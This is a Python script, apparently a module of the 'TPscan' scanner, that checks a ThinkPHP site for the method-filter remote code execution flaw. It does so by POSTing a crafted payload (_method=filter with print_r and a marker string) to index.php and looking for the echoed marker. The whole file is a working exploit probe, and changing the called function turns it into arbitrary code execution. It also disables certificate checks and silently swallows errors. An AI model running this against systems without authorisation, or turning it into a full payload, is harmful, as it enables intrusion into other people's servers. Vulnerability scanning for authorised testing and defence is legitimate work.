#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3
urllib3.disable_warnings()

def thinkphp_method_filter_code_exec_verify(url):
    pocdict = {
        "vulnname":"thinkphp_method_filter_code_exec",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        "response":"",
        "exception":"",
    }
    headers = {
        "User-Agent" : 'TPscan',
    }
    payload = {
        'c':'print_r',
        'f':'4e5e5d7364f443e28fbf0d3ae744a59a',
        '_method':'filter',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php')
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
        if r"4e5e5d7364f443e28fbf0d3ae744a59a" in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['payload'] = payload
            pocdict['proof'] = '4e5e5d7364f443e28fbf0d3ae744a59a'
            pocdict['response'] = req.text
            print(pocdict)

    except:
        pass
